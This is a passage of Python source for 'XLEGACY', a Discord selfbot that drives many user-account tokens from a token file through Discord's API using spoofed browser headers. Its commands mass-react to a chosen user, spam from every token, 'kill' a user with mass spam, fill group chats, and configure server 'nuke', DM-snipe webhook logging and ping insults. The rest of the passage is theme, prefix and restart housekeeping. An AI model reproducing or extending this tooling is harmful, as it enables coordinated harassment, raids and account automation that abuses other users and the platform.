        return m.author == ctx.author and m.channel == ctx.channel

    try:
        token_response = await bot.wait_for('message', timeout=30.0, check=check)
        if token_response.content.lower() == 'all':
            tokens = active_tokens
        else:
            try:
                token_count = int(token_response.content)
                if token_count < 1 or token_count > len(active_tokens):
                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID NUMBER | CHOOSE 1-{len(active_tokens)} |  {reset}\n```")
                    return
                tokens = active_tokens[:token_count]
            except ValueError:
                await ctx.send(f"```ansi\n{red} XLEGACY | INVALID INPUT | ENTER NUMBER OR 'ALL' |  {reset}\n```")
                return
    except asyncio.TimeoutError:
        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE RECEIVED |  {reset}\n```")
        return

    async def reaction_task(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://discord.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        async def add_reaction(message_id):
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
                async with aiohttp.ClientSession() as session:
                    async with session.put(url, headers=headers) as resp:
                        if resp.status == 204:  
                            print(f"{red}Token {token[-4:]} reacted to message{reset}")
                            return True
                        elif resp.status == 429: 
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"{light_red}Rate limited with token {token[-4:]}, waiting {retry_after}s{reset}")
                            await asyncio.sleep(retry_after)
                            return False
                        else:
                            print(f"{light_red}Failed to react with token {token[-4:]}: Status {resp.status}{reset}")
                            await asyncio.sleep(1)
                            return False
            except Exception as e:
                print(f"{light_red}Error adding reaction with token {token[-4:]}: {e}{reset}")
                await asyncio.sleep(1)
                return False

        while (user_id, channel_id) in reactm_running:
            try:
                async for message in ctx.channel.history(limit=1):
                    if message.author.id == user_id and message.id:
                        success = await add_reaction(message.id)
                        if not success: 
                            await asyncio.sleep(0.5)
                await asyncio.sleep(0.5) 
            except Exception as e:
                print(f"{light_red}Error in reaction loop for token {token[-4:]}: {e}{reset}")
                await asyncio.sleep(1)

    reactm_running[(user_id, channel_id)] = True
    tasks = []
    
    for token in tokens:
        task = asyncio.create_task(reaction_task(token))
        tasks.append(task)
        active_reaction_tasks.append(task)
    
    reactm_tasks[(user_id, channel_id)] = tasks
    
    await ctx.send(f"```ansi\n{red} XLEGACY | REACTING WITH {emoji} TO {user.name} USING {len(tokens)} TOKENS |  {reset}\n```")
@bot.command()
async def mreactoff(ctx):
    """Stop all mass reaction sessions in current channel"""
    channel_id = ctx.channel.id
    stopped = False

    for (user_id, chan_id), tasks in list(reactm_tasks.items()):
        if chan_id == channel_id:
            reactm_running.pop((user_id, chan_id), None)
            for task in tasks:
                task.cancel()
            reactm_tasks.pop((user_id, chan_id))
            stopped = True

    if stopped:
        await ctx.send(f"```ansi\n{red} XLEGACY | STOPPED ALL REACTION SESSIONS |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO REACTION SESSIONS RUNNING |  {reset}\n```")





@bot.command()
async def multi(ctx):
    """Display all multi-token commands"""
    help_content = f"""
{red} MULTI-TOKEN COMMANDS {reset}
{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{red}Token Management{reset}
{light_red}[ {red}1{light_red} ] {black}tok                {light_red}- {red}Check status of all tokens{reset}
{light_red}[ {red}2{light_red} ] {black}say <token_index> <message>{light_red} - {red}Send message with specific token{reset}
{light_red}[ {red}3{light_red} ] {black}say <message>      {light_red}- {red}Send message with all tokens{reset}

{red}Mass Actions{reset}
{light_red}[ {red}4{light_red} ] {black}mspam <messages>   {light_red}- {red}Spam with multiple tokens{reset}
{light_red}[ {red}5{light_red} ] {black}mspamoff           {light_red}- {red}Stop multi-token spam{reset}
{light_red}[ {red}6{light_red} ] {black}reactm <emoji> <@user>{light_red} - {red}Mass react to user's messages{reset}
{light_red}[ {red}7{light_red} ] {black}reactoff           {light_red}- {red}Stop mass reactions{reset}
{light_red}[ {red}8{light_red} ] {black}multilast <@user> {light_red}- {red}Multi-token outlast{reset}
{light_red}[ {red}9{light_red} ] {black}stopmultilast      {light_red}- {red}Stop multi-token outlast{reset}

{red}Voice Channel{reset}
{light_red}[ {red}10{light_red} ] {black}multivc <channel_id>{light_red} - {red}Connect multiple tokens to VC{reset}
{light_red}[ {red}11{light_red} ] {black}vcend <channel_id>{light_red} - {red}Disconnect tokens from VC{reset}
{light_red}[ {red}12{light_red} ] {black}vcstop            {light_red}- {red}Stop all voice connections{reset}

{red}Auto Responses{reset}
{light_red}[ {red}13{light_red} ] {black}arm <@user>       {light_red}- {red}Auto-reply with multiple tokens{reset}
{light_red}[ {red}14{light_red} ] {black}armend            {light_red}- {red}Stop multi-token auto-reply{reset}
{light_red}[ {red}15{light_red} ] {black}kill <user_id>    {light_red}- {red}Mass spam user with all tokens{reset}
{light_red}[ {red}16{light_red} ] {black}killend           {light_red}- {red}Stop mass spam{reset}

{red}Group Chat{reset}
{light_red}[ {red}17{light_red} ] {black}gcfill            {light_red}- {red}Add tokens to group chat{reset}
{light_red}[ {red}18{light_red} ] {black}gcleave           {light_red}- {red}Make tokens leave group chat{reset}
{light_red}[ {red}19{light_red} ] {black}gcleaveall        {light_red}- {red}Make tokens leave all group chats{reset}

{red}Status & Presence{reset}
{light_red}[ {red}20{light_red} ] {black}rpcall <messages>{light_red} - {red}Set status for all tokens{reset}

{red}Server Management{reset}
{light_red}[ {red}21{light_red} ] {black}tleave <server_id>{light_red} - {red}Make tokens leave server{reset}

{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
{red}Usage Examples:{reset}
{black}.say 1 Hello world        {light_red}- {red}Send with token 1{reset}
{black}.say Hello everyone       {light_red}- {red}Send with all tokens{reset}
{black}.multivc 123456789        {light_red}- {red}Join voice channel{reset}
{black}.reactm 😂 @user          {light_red}- {red}Mass react to user{reset}
{black}.mspam msg1, msg2, msg3   {light_red}- {red}Spam with messages{reset}

{light_red}Note: Make sure token.txt is filled with your tokens!{reset}
"""
    await ctx.send(f"```ansi\n{help_content}\n```")


@bot.command(name="reset")
async def reset_cmd(ctx):
    """Reset the selfbot - clear console and reload everything"""
    import os
    import sys
    
    # Send reset message
    reset_message = f"""```ansi
{red}
 __   ___      ______ _____          _______     __
 \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
 /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Resetting Selfbot⠀⠀⠀
{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
{red}Clearing console and reloading all modules...
{light_red}This may take a few seconds...{reset}
```"""
    
    try:
        msg = await ctx.send(reset_message)
        
        # Clear all running tasks
        await cleanup_tasks()
        
        # Wait a moment
        await asyncio.sleep(2)
        
        # Update message
        await msg.edit(content=f"""```ansi
{red}
 __   ___      ______ _____          _______     __
 \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
 /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Restarting...⠀⠀⠀
{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
{red}Clearing console...
{green}Reloading modules...
{light_red}Please wait...{reset}
```""")
        
        # Clear console based on OS
        await clear_console()
        
        # Restart the bot
        await restart_bot()
        
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | RESET FAILED | ERROR: {str(e)} |  {reset}\n```")

async def cleanup_tasks():
    """Clean up all running tasks"""
    global outlast_running, multilast_running, spammings, spammingss
    global gc_tasks, kill_tasks, autoreply_tasks, arm_tasks, reactm_running
    
    # Stop all running flags
    outlast_running = False
    multilast_running = False
    spammings = False
    spammingss = False
    
    # Cancel all tasks
    tasks_to_cancel = []
    
    # Outlast tasks
    for task in outlast_tasks.values():
        tasks_to_cancel.append(task)
    outlast_tasks.clear()
    
    # Multilast tasks
    for task in multilast_tasks.values():
        tasks_to_cancel.append(task)
    multilast_tasks.clear()
    
    # GC tasks
    for task in gc_tasks.values():
        tasks_to_cancel.append(task)
    gc_tasks.clear()
    
    # Kill tasks
    for task in kill_tasks.values():
        tasks_to_cancel.append(task)
    kill_tasks.clear()
    
    # Autoreply tasks
    for task in autoreply_tasks.values():
        tasks_to_cancel.append(task)
    autoreply_tasks.clear()
    
    # Arm tasks
    for task in arm_tasks.values():
        tasks_to_cancel.append(task)
    arm_tasks.clear()
    
    # Reaction tasks
    for task in active_reaction_tasks:
        tasks_to_cancel.append(task)
    active_reaction_tasks.clear()
    
    # Reactm tasks
    for task_list in reactm_tasks.values():
        for task in task_list:
            tasks_to_cancel.append(task)
    reactm_tasks.clear()
    reactm_running.clear()
    
    # Cancel all tasks
    for task in tasks_to_cancel:
        try:
            task.cancel()
        except:
            pass

async def clear_console():
    """Clear the console based on operating system"""
    try:
        if os.name == 'nt':  # Windows
            os.system('cls')
        else:  # Linux/Mac
            os.system('clear')
        print(f"{green}Console cleared successfully{reset}")
    except Exception as e:
        print(f"{light_red}Failed to clear console: {e}{reset}")

async def restart_bot():
    """Restart the bot process"""
    try:
        print(f"{red}Restarting selfbot...{reset}")
        
        # Reload critical modules
        import importlib
        import discord
        import aiohttp
        
        # Reload modules that might have been modified
        modules_to_reload = ['discord', 'discord.ext.commands', 'aiohttp', 'asyncio']
        
        for module_name in modules_to_reload:
            try:
                if module_name in sys.modules:
                    importlib.reload(sys.modules[module_name])
                    print(f"{green}Reloaded {module_name}{reset}")
            except Exception as e:
                print(f"{light_red}Failed to reload {module_name}: {e}{reset}")
        
        # Wait a moment for cleanup
        await asyncio.sleep(1)
        
        # Re-import and re-initialize
        print(f"{red}Reinitializing bot...{reset}")
        
        # This will effectively restart the bot by re-running the on_ready event
        # and re-establishing all connections
        
        print(f"{green}Selfbot reset complete!{reset}")
        print(f"{light_red}All tasks stopped, console cleared, and modules reloaded.{reset}")
        
    except Exception as e:
        print(f"{light_red}Error during restart: {e}{reset}")
        # Fallback: restart the entire script
        print(f"{red}Performing hard restart...{reset}")
        os.execv(sys.executable, ['python'] + sys.argv)



@bot.command()
async def hardreset(ctx):
    """Hard reset - completely restart the Python process"""
    import os
    import sys
    
    await ctx.send(f"""```ansi
{red}
 __   ___      ______ _____          _______     __
 \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
 /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}HARD RESET INITIATED⠀⠀⠀
{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
{red}Completely restarting Python process...
{light_red}This will take a moment...{reset}
""")
    
    await asyncio.sleep(2)
    
    # Hard restart - completely new process
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.command()
async def theme(ctx, theme_name: str = None):
    """Change the color theme of the selfbot"""
    global current_theme
    
    if theme_name is None:
        # Show available themes
        theme_list = []
        for theme_key, theme_data in themes.items():
            current_indicator = " ← CURRENT" if theme_key == current_theme else ""
            theme_list.append(f"{theme_secondary}[ {theme_primary}{theme_key}{theme_secondary} ] {theme_accent}{theme_data['name']}{current_indicator}{reset}")
        
        theme_message = f"""
{theme_primary} AVAILABLE THEMES {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{"\n".join(theme_list)}

{theme_secondary}Usage: {theme_accent}.theme <theme_name>{reset}
{theme_secondary}Example: {theme_accent}.theme green{reset}
{theme_secondary}Current theme: {theme_primary}{themes[current_theme]['name']}{reset}
"""
        await ctx.send(f"```ansi\n{theme_message}\n```")
        return
    
    theme_name = theme_name.lower()
    
    if theme_name in themes:
        if update_theme(theme_name):
            success_message = f"""
{theme_primary} THEME UPDATED {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{theme_secondary}Successfully changed theme to: {theme_primary}{themes[theme_name]['name']}{reset}

{theme_primary}Preview:{reset}
{theme_secondary}[ {theme_primary}Example{theme_secondary} ] {theme_accent}This is how your text will look{reset}
{theme_secondary}[ {theme_primary}123{theme_secondary} ] {theme_accent}With the new color scheme{reset}

{theme_secondary}All commands will now use the {theme_primary}{themes[theme_name]['name']}{theme_secondary} color scheme.{reset}
"""
            await ctx.send(f"```ansi\n{success_message}\n```")
        else:
            await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO UPDATE THEME |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | INVALID THEME | AVAILABLE: {', '.join(themes.keys())} |  {reset}\n```")

@bot.command()
async def settings(ctx):
    """Display all settings and configuration commands"""
    settings_content = f"""
{theme_primary} SETTINGS & CONFIGURATION {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{theme_primary}Appearance Settings{reset}
{theme_secondary}[ {theme_primary}1{theme_secondary} ] {theme_accent}theme <name>          {theme_secondary}- {theme_primary}Change color theme (red/green/purple/blue/cyan){reset}

{theme_primary}Multi-Token Settings{reset}
{theme_secondary}[ {theme_primary}2{theme_secondary} ] {theme_accent}multilastconfig <count> <delay>{theme_secondary} - {theme_primary}Configure multi-token outlast{reset}
{theme_secondary}[ {theme_primary}3{theme_secondary} ] {theme_accent}nukeconfig            {theme_secondary}- {theme_primary}View nuke configuration{reset}
{theme_secondary}[ {theme_primary}4{theme_secondary} ] {theme_accent}nukehook <message>    {theme_secondary}- {theme_primary}Set webhook message for nuke{reset}
{theme_secondary}[ {theme_primary}5{theme_secondary} ] {theme_accent}nukename <name>       {theme_secondary}- {theme_primary}Set server name for nuke{reset}
{theme_secondary}[ {theme_primary}6{theme_secondary} ] {theme_accent}nukedelay <seconds>   {theme_secondary}- {theme_primary}Set webhook delay for nuke{reset}
{theme_secondary}[ {theme_primary}7{theme_secondary} ] {theme_accent}nukechannel <name>    {theme_secondary}- {theme_primary}Set channel name for nuke{reset}

{theme_primary}Auto-Response Settings{reset}
{theme_secondary}[ {theme_primary}8{theme_secondary} ] {theme_accent}pingresponse <action> <response>{theme_secondary} - {theme_primary}Configure ping responses{reset}
{theme_secondary}[ {theme_primary}9{theme_secondary} ] {theme_accent}pinginsult <action>   {theme_secondary}- {theme_primary}Configure ping insults{reset}
{theme_secondary}[ {theme_primary}10{theme_secondary} ] {theme_accent}pingreact <action> <emoji>{theme_secondary} - {theme_primary}Configure ping reactions{reset}

{theme_primary}Profile Settings{reset}
{theme_secondary}[ {theme_primary}11{theme_secondary} ] {theme_accent}setbio <text>         {theme_secondary}- {theme_primary}Set your bio{reset}
{theme_secondary}[ {theme_primary}12{theme_secondary} ] {theme_accent}rotatebio <texts>     {theme_secondary}- {theme_primary}Rotate through multiple bios{reset}
{theme_secondary}[ {theme_primary}13{theme_secondary} ] {theme_accent}setpronoun <text>     {theme_secondary}- {theme_primary}Set your pronouns{reset}
{theme_secondary}[ {theme_primary}14{theme_secondary} ] {theme_accent}rotatepronoun <texts>{theme_secondary} - {theme_primary}Rotate through pronouns{reset}

{theme_primary}Status Settings{reset}
{theme_secondary}[ {theme_primary}15{theme_secondary} ] {theme_accent}rstatus <statuses>    {theme_secondary}- {theme_primary}Rotate through statuses{reset}
{theme_secondary}[ {theme_primary}16{theme_secondary} ] {theme_accent}rstatusstop          {theme_secondary}- {theme_primary}Stop status rotation{reset}
{theme_secondary}[ {theme_primary}17{theme_secondary} ] {theme_accent}stream <statuses>     {theme_secondary}- {theme_primary}Set streaming status with images{reset}

{theme_primary}DM Snipe Settings{reset}
{theme_secondary}[ {theme_primary}18{theme_secondary} ] {theme_accent}dmsnipe log <webhook> {theme_secondary}- {theme_primary}Set DM snipe webhook{reset}
{theme_secondary}[ {theme_primary}19{theme_secondary} ] {theme_accent}dmsnipe toggle        {theme_secondary}- {theme_primary}Toggle DM snipe{reset}
{theme_secondary}[ {theme_primary}20{theme_secondary} ] {theme_accent}dmsnipe status        {theme_secondary}- {theme_primary}Check DM snipe status{reset}

{theme_primary}GC Trap Settings{reset}
{theme_secondary}[ {theme_primary}21{theme_secondary} ] {theme_accent}gctrapconfig          {theme_secondary}- {theme_primary}View GC trap configuration{reset}
{theme_secondary}[ {theme_primary}22{theme_secondary} ] {theme_accent}gctrapenable          {theme_secondary}- {theme_primary}Enable GC trap{reset}
{theme_secondary}[ {theme_primary}23{theme_secondary} ] {theme_accent}gctrapdisable         {theme_secondary}- {theme_primary}Disable GC trap{reset}

{theme_primary}Auto-Moderation Settings{reset}
{theme_secondary}[ {theme_primary}24{theme_secondary} ] {theme_accent}autonuke <action> <@user>{theme_secondary} - {theme_primary}Auto-kick users on join{reset}
{theme_secondary}[ {theme_primary}25{theme_secondary} ] {theme_accent}forcepurge <action> <@user>{theme_secondary} - {theme_primary}Auto-delete user messages{reset}
{theme_secondary}[ {theme_primary}26{theme_secondary} ] {theme_accent}autonick <action> <@user> <nick>{theme_secondary} - {theme_primary}Force nicknames{reset}

{theme_primary}System Settings{reset}
{theme_secondary}[ {theme_primary}27{theme_secondary} ] {theme_accent}reset                 {theme_secondary}- {theme_primary}Reset selfbot (clear console){reset}
{theme_secondary}[ {theme_primary}28{theme_secondary} ] {theme_accent}hardreset             {theme_secondary}- {theme_primary}Hard reset (restart process){reset}
{theme_secondary}[ {theme_primary}29{theme_secondary} ] {theme_accent}reload                {theme_secondary}- {theme_primary}Reload selfbot{reset}

{theme_secondary}[ {theme_primary}27{theme_secondary} ] {theme_accent}prefix <new_prefix>   {theme_secondary}- {theme_primary}Change command prefix{reset}
{theme_secondary}[ {theme_primary}28{theme_secondary} ] {theme_accent}prefixreset          {theme_secondary}- {theme_primary}Reset prefix to default (.){reset}
{theme_secondary}[ {theme_primary}29{theme_secondary} ] {theme_accent}reset                {theme_secondary}- {theme_primary}Reset selfbot (clear console){reset}
{theme_secondary}[ {theme_primary}30{theme_secondary} ] {theme_accent}hardreset            {theme_secondary}- {theme_primary}Hard reset (restart process){reset}
{theme_secondary}[ {theme_primary}31{theme_secondary} ] {theme_accent}reload               {theme_secondary}- {theme_primary}Reload selfbot{reset}

{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
{theme_primary}Current Settings:{reset}
{theme_secondary}Theme: {theme_primary}{themes[current_theme]['name']}{reset}
{theme_secondary}Tokens: {theme_primary}{len(load_tokens())} loaded{reset}
{theme_secondary}Prefix: {theme_primary}{PREFIX}{reset}

{theme_secondary}Use {theme_primary}.theme{theme_secondary} to see available color themes!{reset}
"""
    await ctx.send(f"```ansi\n{settings_content}\n```")

theme_primary = red
theme_secondary = light_red
theme_accent = black
theme_primary = red
theme_secondary = light_red
theme_accent = black

def update_theme(theme_name):
    """Update the current theme colors"""
    global current_theme, theme_primary, theme_secondary, theme_accent, red, light_red, black, accent_color
    
    if theme_name in themes:
        current_theme = theme_name
        theme_data = themes[theme_name]
        
        theme_primary = theme_data["primary"]
        theme_secondary = theme_data["secondary"] 
        theme_accent = theme_data["accent"]

        # Update commonly used color variables so command outputs use the new theme
        try:
            global red, light_red, black, accent_color
            red = theme_primary
            light_red = theme_secondary
            black = theme_accent
            accent_color = theme_accent
        except Exception:
            pass
        
        # Save theme preference
        try:
            with open('theme_config.json', 'w') as f:
                json.dump({"theme": theme_name}, f)
        except:
            pass
            
        return True
    return False

def load_theme():
    """Load saved theme preference"""
    global current_theme, theme_primary, theme_secondary, theme_accent
    
    try:
        with open('theme_config.json', 'r') as f:
            config = json.load(f)
            if "theme" in config:
                update_theme(config["theme"])
    except FileNotFoundError:
        # Use default red theme
        update_theme("red")

# Load theme when bot starts
load_theme()

def format_with_theme(text):
    """Format text with current theme colors"""
    return text.format(
        red=theme_primary,
        light_red=theme_secondary,
        black=theme_accent
    )

@bot.command()
async def prefix(ctx, new_prefix: str = None):
    """Change the bot's command prefix"""
    global PREFIX
    
    if new_prefix is None:
        # Show current prefix and usage
        prefix_info = f"""
{theme_primary} PREFIX SETTINGS {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{theme_secondary}Current Prefix: {theme_primary}{PREFIX}{reset}
{theme_secondary}Example Usage: {theme_primary}{PREFIX}menu{reset}

{theme_secondary}Available Prefixes:{reset}
{theme_secondary}[ {theme_primary}.{theme_secondary} ] {theme_accent}Dot (default){reset}
{theme_secondary}[ {theme_primary}!{theme_secondary} ] {theme_accent}Exclamation{reset}  
{theme_secondary}[ {theme_primary}${theme_secondary} ] {theme_accent}Dollar{reset}
{theme_secondary}[ {theme_primary}?{theme_secondary} ] {theme_accent}Question{reset}
{theme_secondary}[ {theme_primary}>{theme_secondary} ] {theme_accent}Greater than{reset}
{theme_secondary}[ {theme_primary}<{theme_secondary} ] {theme_accent}Less than{reset}
{theme_secondary}[ {theme_primary}~{theme_secondary} ] {theme_accent}Tilde{reset}
{theme_secondary}[ {theme_primary}*{theme_secondary} ] {theme_accent}Asterisk{reset}
{theme_secondary}[ {theme_primary}+{theme_secondary} ] {theme_accent}Plus{reset}
{theme_secondary}[ {theme_primary}-{theme_secondary} ] {theme_accent}Minus{reset}
{theme_secondary}[ {theme_primary}&{theme_secondary} ] {theme_accent}Ampersand{reset}
{theme_secondary}[ {theme_primary}^{theme_secondary} ] {theme_accent}Caret{reset}
{theme_secondary}[ {theme_primary}%{theme_secondary} ] {theme_accent}Percent{reset}

{theme_secondary}Usage: {theme_primary}{PREFIX}prefix <new_prefix>{reset}
{theme_secondary}Example: {theme_primary}{PREFIX}prefix !{reset}
{theme_secondary}Example: {theme_primary}{PREFIX}prefix ?{reset}

{theme_secondary}Note: The prefix cannot contain spaces or be longer than 3 characters.{reset}
"""
        await ctx.send(f"```ansi\n{prefix_info}\n```")
        return
    
    # Validate new prefix
    if len(new_prefix) > 3:
        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | PREFIX TOO LONG | MAX 3 CHARACTERS |  {reset}\n```")
        return
    
    if ' ' in new_prefix:
        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | PREFIX CANNOT CONTAIN SPACES |  {reset}\n```")
        return
    
    # Save new prefix
    old_prefix = PREFIX
    PREFIX = new_prefix
    
    if save_prefix(new_prefix):
        # Update bot command prefix
        bot.command_prefix = PREFIX
        
        success_message = f"""
{theme_primary} PREFIX UPDATED {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{theme_secondary}Successfully changed prefix:{reset}
{theme_secondary}Old Prefix: {theme_primary}{old_prefix}{reset}
{theme_secondary}New Prefix: {theme_primary}{PREFIX}{reset}

{theme_secondary}Examples:{reset}
{theme_secondary}• {theme_primary}{PREFIX}menu{theme_secondary} - Open main menu{reset}
{theme_secondary}• {theme_primary}{PREFIX}help{theme_secondary} - Show help{reset}
{theme_secondary}• {theme_primary}{PREFIX}multi{theme_secondary} - Multi-token commands{reset}
{theme_secondary}• {theme_primary}{PREFIX}settings{theme_secondary} - Settings menu{reset}

{theme_secondary}The new prefix will persist after restart.{reset}
"""
        await ctx.send(f"```ansi\n{success_message}\n```")
    else:
        # Revert if save failed
        PREFIX = old_prefix
        bot.command_prefix = PREFIX
        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO SAVE PREFIX |  {reset}\n```")

@bot.command()
async def prefixreset(ctx):
    """Reset prefix to default (.)"""
    global PREFIX
    
    old_prefix = PREFIX
    PREFIX = "."
    
    if save_prefix("."):
        bot.command_prefix = PREFIX
        
        reset_message = f"""
{theme_primary} PREFIX RESET {reset}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}

{theme_secondary}Successfully reset prefix to default:{reset}
{theme_secondary}Old Prefix: {theme_primary}{old_prefix}{reset}
{theme_secondary}New Prefix: {theme_primary}{PREFIX}{reset}

{theme_secondary}All commands now use: {theme_primary}.command{reset}
{theme_secondary}Example: {theme_primary}.menu{reset}

{theme_secondary}Prefix has been reset to default dot (.){reset}
"""
        await ctx.send(f"```ansi\n{reset_message}\n```")
    else:
        PREFIX = old_prefix
        bot.command_prefix = PREFIX
        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO RESET PREFIX |  {reset}\n```")

@bot.command()
async def tstatus(ctx, *, status_text: str = None):
    tokens = load_tokens()
    total_tokens = len(tokens)
    
    if not status_text:
        await ctx.send(f"```{theme_primary}Please provide a status text{reset}```")
        return

    status_msg = await ctx.send(f"""```ansi
{theme_primary}Token Status Changer{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                try:
                    online_data = {
                        'status': 'online'
                    }
                    
                    status_data = {
                        'custom_status': {
                            'text': status_text
                        },
                        'status': 'online'  
                    }
                    
                    async with session.patch(
                        'https://discord.com/api/v9/users/@me/settings',
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        },
                        json=online_data
                    ) as resp1:
                        
                        async with session.patch(
                            'https://discord.com/api/v9/users/@me/settings',
                            headers={
                                'Authorization': token,
                                'Content-Type': 'application/json'
                            },
                            json=status_data
                        ) as resp2:
                            if resp1.status == 200 and resp2.status == 200:
                                success += 1
                            
                            progress = f"""```ansi
{theme_primary}Changing Statuses...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current status: {status_text}```"""
                            await status_msg.edit(content=progress)
                            await asyncio.sleep(0.5)
                except Exception as e:
                    await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
                    return

        await status_msg.edit(content=f"""```ansi
{theme_primary}Status Change Complete{reset}
Successfully changed: {success}/{len(selected_tokens)} statuses to: {status_text}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
    except Exception as e:
        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")

@bot.command()
async def tstatusoff(ctx):
    tokens = load_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
{theme_primary}Token Status Reset{reset}
Total tokens available: {total_tokens}
How many tokens do you want to reset? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                try:
                    reset_data = {
                        'custom_status': None,
                        'status': 'online' 
                    }
                    
                    async with session.patch(
                        'https://discord.com/api/v9/users/@me/settings',
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        },
                        json=reset_data
                    ) as resp:
                        if resp.status == 200:
                            success += 1
                        
                        progress = f"""```ansi
{theme_primary}Resetting Statuses...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(0.5)
                except Exception as e:
                    await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
                    return

        await status_msg.edit(content=f"""```ansi
{theme_primary}Status Reset Complete{reset}
Successfully reset: {success}/{len(selected_tokens)} statuses```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
    except Exception as e:
        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")

@bot.command()
async def tinfo(ctx, token_input: str):
    """Get token account information"""
    tokens = load_tokens()
    
    try:
        index = int(token_input) - 1
        if 0 <= index < len(tokens):
            token = tokens[index]
        else:
            await ctx.send(f"```{theme_primary}Invalid token number{reset}```")
            return
    except ValueError:
        token = token_input
        if token not in tokens:
            await ctx.send(f"```{theme_primary}Invalid token{reset}```")
            return

    status_msg = await ctx.send(f"```{theme_primary}Fetching token information...{reset}```")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://discord.com/api/v9/users/@me',
                headers={
                    'Authorization': token,
